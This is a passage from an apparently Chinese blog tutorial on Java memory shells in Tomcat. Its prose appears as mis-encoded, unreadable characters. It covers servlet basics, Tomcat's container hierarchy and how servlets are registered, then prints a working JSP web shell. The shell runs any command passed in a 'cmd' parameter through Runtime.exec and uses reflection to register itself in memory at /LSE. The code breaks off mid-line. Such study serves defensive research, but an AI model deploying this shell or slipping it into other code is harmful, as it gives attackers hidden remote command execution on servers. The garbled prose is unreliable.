javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.xml.ws.Service;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloLSE</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String LLL;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        LLL=<span class="string">&quot;LSE&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">//super.service(req, resp);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;Hello, &quot;</span> + name + <span class="string">&quot;!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;doGET!!!!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;doPOST!!!!&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>æˆ‘å…ˆæ˜¯æ²¡æœ‰è°ƒç”¨super.service(req, resp);æ¥å°è¯•å…¶ä»–è¿™ä¸ªweb<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-164043087.png" class=""><br>ç»è¿‡å°è¯•å‘ç°ä¸è®ºæˆ‘ç”¨ä»€ä¹ˆæ–¹æ³•éƒ½ä¹‹åè§¦å‘serviceï¼Œè¿™æ˜¯å› ä¸ºserviceçš„ç­‰çº§è¦é«˜äºdoGetå’ŒdoPostï¼Œå…¶å…ˆä¸€æ­¥æ‹¦æˆªçš„è¯·æ±‚å¹¶å“åº”ã€‚<br>æˆ‘ä»¬å†äº§ç”Ÿä¸€ä¸‹è°ƒç”¨super.service(req, resp);ä¼šå‘ç”Ÿä»€ä¹ˆ<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-164339979.png" class=""><br>å…¶ä¼šæ ¹æ®æ–¹æ³•çš„ä¸åŒæ¥è°ƒç”¨æˆ‘ä»¬é‡æ–°çš„doGetå’ŒdoPostï¼Œä¸”å…¶è‡ªèº«çš„å“åº”æ¼æ´ä¸å‘ç”Ÿæ”¹å˜ã€‚\</p><p>è¿™æ—¶å€™æˆ‘è„‘å­é‡Œåˆæœ‰äº†ä¸ªé—®é¢˜ï¼Œå¦‚æœæˆ‘æ²¡é‡æ–°doGetæˆ–è€…doPostä¼šå‘ç”Ÿä»€ä¹ˆ?<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-164557393.png" class=""><br>è¿™æ˜¯æˆ‘å‘ç°å…¶ç›´æ¥è¿”å›405é”™è¯¯è¯´æˆ‘ä»¬çš„è¯·æ±‚æ–¹æ³•æœ‰é—®é¢˜ï¼Œè¿è‡ªèº«çš„å“åº”é€»è¾‘ä¹Ÿä¸ä¼šè¿è¡Œäº†</p><p>åŸæœ¬æˆ‘æƒ³ç®€å•è°ƒè¯•ä¸€ä¸‹å…¶é€»è¾‘ä½†æ˜¯å‘ç°ç«Ÿç„¶è°ƒä¸åŠ¨ï¼Œåé¢å‘ç°æ—¶æˆ‘mavençš„é‡Œæ²¡æœ‰å®‰è£…omcat-catalina<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>9.0.97<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><br>ä½†å°±ç®—å®‰è£…äº†åä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½çœ‹åˆ°å…¨éƒ¨çš„é€»è¾‘è°ƒä¸‹æ¥éå¸¸çš„æ€ª<br>æ‰€æœ‰æˆ‘å°±ä¸åœ¨æ­¤æ·±å…¥äº†ã€‚</p><h2 id="å•¥æ˜¯tomcat"><a href="#å•¥æ˜¯tomcat" class="headerlink" title="å•¥æ˜¯tomcat"></a>å•¥æ˜¯tomcat</h2><p>æ¥ä»‹ç»ä¸€ä¸‹tomcatå§ï¼Œæˆ‘ä»¬å‰é¢ç¼–å†™servletçš„demoæ—¶éƒ½ç”¨åˆ°äº†tomcatï¼Œtomcatç®€å•æ¥è¯´å°±æ˜¯ä¸€ä¸ªwebçš„å®¹å™¨ï¼Œå…¶å°†æˆ‘ä»¬çš„servletè¿›è¡Œäº†å¤šå±‚åŒ…è£…</p><p>è€Œtomcatæ€»å…±æœ‰4ç§å®¹å™¨åˆ†åˆ«ä¸ºEngineã€Hostã€Contextå’Œ Wrapperã€‚è€Œè¿™å››ç§å®¹å™¨çš„å…³ç³»ä¸æ˜¯å¹³è¡Œçš„è€Œæ˜¯çˆ¶ä¸å­çš„å…³ç³»</p><p>æ”¾ä¸€å¼ ç»å…¸è€å›¾<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-175354648.png" class="">  </p><p>ä¸Šé¢çš„å›¾æ ‡è¯†äº†tomcatå®¹å™¨çš„åµŒå¥—å…³ç³»ä¸€ä¸ªEngineå†…å¥—å¤šä¸ªHostï¼Œä¸€ä¸ªHostå†…å¥—å¤šä¸ªContextï¼Œä¸€ä¸ªContextä¸‹å¥—å¤šä¸ªwrapper</p><p>Wrapperå…¶å®å°±ç®—å¯¹Servletè¿›è¡Œç®€å•çš„åŒ…è£…ï¼Œå¯ä»¥ç®€å•æŠŠå®ƒç†è§£æˆä¸€ä¸ªservletå®ä¾‹<br>è€ŒContextå°±ç®—ä¸€ä¸ªwebçš„ä¸€çº§è·¯ç”±<br>è€ŒHostå°±ç®—ä¸€ä¸ªwebç«™ç‚¹ã€‚<br>Engineå°±æ˜¯å¼•æ“ï¼Œå…¶ä½œç”¨æ˜¯åè°ƒå¤šä¸ªç«™ç‚¹å…¶é€šå¸¸ä¸Serviceæ¥é…åˆè¿›è¡Œå·¥ä½œ<strong>æ³¨æ„:è¿™ä¸ªserviceå’Œæˆ‘ä»¬ä¹‹å‰å°†çš„servletä¸‹çš„serviceçš„æ–¹æ³•æ˜¯æ²¡æœ‰å…³ç³»çš„ã€‚servicçš„ä½œç”¨ä¸»è¦æ˜¯ç®¡ç†å’Œå¼€å¯å¼•æ“å’Œè¿æ¥å™¨çš„</strong><br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-183725289.png" class="">  </p><p>ä»ä¸Šé¢çš„å›¾æˆ‘ä»¬å°±å¯ä»¥å¾ˆæ¸…æ™°çš„çœ‹å‡ºæ¥æ¯ä¸ªå®¹å™¨çš„å…³ç³»</p><h1 id="servletçš„åˆå§‹åŒ–è½¬è½½æµç¨‹"><a href="#servletçš„åˆå§‹åŒ–è½¬è½½æµç¨‹" class="headerlink" title="servletçš„åˆå§‹åŒ–è½¬è½½æµç¨‹"></a>servletçš„åˆå§‹åŒ–è½¬è½½æµç¨‹</h1><p>æˆ‘ä»¬é€šè¿‡ä¹‹å‰çš„å­¦ä¹ éƒ½çŸ¥é“äº†servletä¼šé€šè¿‡web.xmlæ¥å¯¹è·¯ç”±è¿›è¡Œæ˜ å°„ã€‚é‚£å…¶è¿‡ç¨‹æ˜¯æ€ä¹ˆæ ·çš„å‘¢?<br>ç®€å•è°ƒè¯•ä¸€ä¸‹ã€‚<br><a href="https://blog.csdn.net/u010883443/article/details/107465308">Tomcatæºç åˆè¯†ä¸€ Tomcatæ•´ç†æµç¨‹å›¾</a><br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/liucheng.png" class="" title="alt text"><br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-205207554.png" class="">  </p><p>ä»ä¸Šé¢çš„æµç¨‹å›¾å¯ä»¥çœ‹å‡ºæ¥xmlèµ‹å€¼ä¸ºè·¯ç”±çš„è¿‡ç¨‹æ˜¯åœ¨configureContextè¿™ä¸ªç±»ä¸‹å®ç°çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥åœ¨è¿™ä¸ªç±»é‡Œä¸‹ä¸ªæ–­ç‚¹</p><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-212949396.png" class="">  <p>è¿è¡Œåˆ°æ–­ç‚¹æˆ‘ä»¬å¯ä»¥æŸ¥çœ‹webxmlçš„å†…å®¹<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-213101017.png" class=""><br>å…¶å­˜å‚¨ç€xmlä¸­å®šä¹‰çš„è·¯ç”±ï¼Œåç§°ï¼Œå…¨ç±»åç­‰<br>æˆ‘ä»¬å†çœ‹ä¸€ä¸‹contextçš„ç±»å‹å¯ä»¥å‘ç°å…¶ä¸ºStandardContext<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-222048667.png" class="">  </p><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-213521400.png" class="">  <p>æˆ‘ä»¬ä¸€è·¯å¾€ä¸‹è°ƒï¼Œè°ƒåˆ°å¦‚ä¸Šä»£ç ã€‚ä¸Šé¢çš„åœ°æ–¹ï¼Œä¸Šé¢çš„ä»£ç å°±æ˜¯ä¸€ä¸ªforå¾ªç¯å°†webxmlçš„å†…å®¹èµ‹å€¼ç»™servletã€‚<br>ç„¶åå†forå¾ªç¯å†…åˆ›å»ºwrapperã€‚ç„¶ååé¢çš„æ“ä½œå°±æ˜¯ä½¿ç”¨wrapperæ¥å°è£…servletã€‚å‰é¢ä¸¤ä¸ªservletæ˜¯ç³»ç»Ÿè‡ªå¸¦çš„<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-221435769.png" class=""><br>default<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-221455201.png" class=""><br>jsp<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-221525723.png" class=""><br>æˆ‘ä»¬è¿™é‡Œç›´æ¥ä»ç¬¬ä¸‰ä¸ªå¼€å§‹è°ƒ</p><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-221631431.png" class="">  <p>å…ˆæ˜¯setnameï¼Œnameå°±æ˜¯xmlä¸­çš„nameã€‚</p><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-221733194.png" class="">  <p>ç„¶åæ˜¯setclass<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-222523016.png" class="">  </p><p>ä¹‹åå°±ç›´æ¥å°†wrapperæŒ‚è½½åˆ°contextä¹‹ä¸‹äº†ã€‚</p><p>ç°åœ¨æˆ‘ä»¬è¿˜å·®ä¸€ä¸ªè®¾ç½®è·¯ç”±çš„éƒ¨åˆ†<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-221820901.png" class=""><br>å¦‚ä¸Šã€‚<br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-222527082.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°å°±æ˜¯åœ¨ä¸‹ä¸€è¡Œçš„ä»£ç ï¼Œè·¯ç”±å¥½åƒæ˜¯ç›´æ¥æŒ‚è½½åˆ°äº†Contextä¸‹ã€‚</p><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-222929966.png" class="">  <p>åˆ°è¿™é‡Œtomcatçš„xmlè·¯ç”±æ³¨å†Œå°±å·²ç»å®Œæˆäº†ï¼Œä½†æ˜¯å…‰æ³¨å†Œæ˜¯æ²¡æ³•æ‰§è¡Œä»£ç çš„ï¼Œè¿˜éœ€è¦å¯¹ç±»çš„å®ä¾‹åŒ–ï¼Œä½†æ˜¯å› ä¸ºæ‡’åŠ è½½çš„é€»è¾‘ï¼Œåªæœ‰åœ¨æˆ‘ä»¬è®¿é—®è·¯ç”±æ—¶æ‰ä¼šè¿›è¡Œå®ä¾‹åŒ–çš„æ“ä½œ</p><h1 id="jspç”Ÿæˆå†…å­˜é©¬"><a href="#jspç”Ÿæˆå†…å­˜é©¬" class="headerlink" title="jspç”Ÿæˆå†…å­˜é©¬"></a>jspç”Ÿæˆå†…å­˜é©¬</h1><p>æˆ‘ä»¬å…ˆå°è¯•ä½¿ç”¨jspæ¥ç”Ÿæˆå†…å­˜é©¬<br>æˆ‘ä»¬å…ˆå†™å®šä¹‰ä¸€ä¸ªæ¶æ„çš„servletç±»å¦‚ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String LLL;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            LLL=<span class="string">&quot;LSE&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼Œè·å–å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºæµ</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä½¿ç”¨ BufferedInputStream åŒ…è£… InputStreamï¼Œæé«˜æ•°æ®è¯»å–æ•ˆç‡</span></span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="comment">// æŒç»­è¯»å–è¾“å…¥æµä¸­çš„æ•°æ®ï¼Œç›´åˆ°æµç»“æŸï¼ˆå³è¯»å–åˆ° -1ï¼‰</span></span><br><span class="line">            <span class="keyword">while</span> ((len = bis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// å°†è¯»å–åˆ°çš„å­—èŠ‚ï¼ˆlenï¼‰å†™å…¥ HTTP å“åº”æµï¼Œå‘å®¢æˆ·ç«¯è¿”å›æ•°æ®</span></span><br><span class="line">                resp.getWriter().write(len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>ç„¶åå°±æ˜¯æƒ³åŠæ³•å°†ä¸Šé¢çš„æ¶æ„ç±»æ³¨å†Œäº†ã€‚æ ¹æ®ä¹‹å‰çš„æ³¨å†Œæµç¨‹æˆ‘ä»¬è¦å…ˆè·å¾—ä¸€ä¸ªstandardContextã€‚<br>å†™å‡ºå¦‚ä¸‹ä»£ç æ‰“ä¸ªæ–­ç‚¹è°ƒè¯•ä¸€ä¸‹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">System.out.println(servletContext);</span><br></pre></td></tr></table></figure><br><img src="/2024/11/22/%E5%88%9D%E6%8E%A2java%E5%86%85%E5%AD%98%E9%A9%AC/IMG_20241123-231558280.png" class=""><br>æˆ‘ä»¬å¯ä»¥å‘ç°servletContextçš„contextçš„contextå°±æ˜¯æˆ‘ä»¬è¦çš„standardContextè¿™é‡Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åå°„æ¥å¾—åˆ°<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (Field)servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>); <span class="comment">//åå°„å¾—åˆ°servletContextçš„contextå­—æ®µ</span></span><br><span class="line">applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">appContext</span> <span class="operator">=</span> (ApplicationContext)applicationContext.get(servletContext); <span class="comment">//é€šè¿‡Field.getçš„æ–¹æ³•æ¥è·å–è¿™ä¸ªå­—æ®µçš„å€¼å³è·å–contextçš„å€¼ApplicationContext</span></span><br><span class="line">    </span><br><span class="line">Field standardContextField=appContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext)standardContextField.get(appContext);</span><br></pre></td></tr></table></figure><br>å¾—åˆ°StandardContextåï¼Œæˆ‘ä»¬å°±åªè¦æŒ‰ç€ä¹‹å‰è°ƒçš„æ­¥éª¤æ³¨å†Œå°±å¯ä»¥äº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> context.createWrapper();</span><br><span class="line">wrapper.setName(<span class="string">&quot;LSE_shell&quot;</span>);</span><br><span class="line">wrapper.setServletClass(Shell.class.getName());</span><br><span class="line">wrapper.setServlet(<span class="keyword">new</span> <span class="title class_">Shell</span>());</span><br><span class="line">context.addChild(wrapper);</span><br><span class="line">context.addServletMappingDecoded(<span class="string">&quot;/LSE&quot;</span>,<span class="string">&quot;LSE_shell&quot;</span>);</span><br></pre></td></tr></table></figure><br>ç»„åˆèµ·æ¥å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: <span class="number">24882</span></span><br><span class="line">  Date: <span class="number">2024</span>/<span class="number">11</span>/<span class="number">23</span></span><br><span class="line">  Time: ä¸‹åˆ<span class="number">11</span>:<span class="number">01</span></span><br><span class="line">  To change <span class="built_in">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> String LLL;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            LLL=<span class="string">&quot;LSE&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">            <span class="comment">// æ‰§è¡Œå¤–éƒ¨å‘½ä»¤ï¼Œè·å–å‘½ä»¤çš„æ ‡å‡†è¾“å‡ºæµ</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä½¿ç”¨ BufferedInputStream åŒ…è£… InputStreamï¼Œæé«˜æ•°æ®è¯»å–æ•ˆç‡</span></span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(is);</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> len;</span><br><span class="line">            <span class="comment">// æŒç»­è¯»å–è¾“å…¥æµä¸­çš„æ•°æ®ï¼Œç›´åˆ°æµç»“æŸï¼ˆå³è¯»å–åˆ° -1ï¼‰</span></span><br><span class="line">            <span class="keyword">while</span> ((len = bis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// å°†è¯»å–åˆ°çš„å­—èŠ‚ï¼ˆlenï¼‰å†™å…¥ HTTP å“åº”æµï¼Œå‘å®¢æˆ·ç«¯è¿”å›æ•°æ®</span></span><br><span class="line">                resp.getWriter().write(len);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (Field)servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">appContext</span> <span class="operator">=</span> (ApplicationContext)applicationContext.get(servletContext);</span><br><span class="line">    Field standardContextField=appContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> 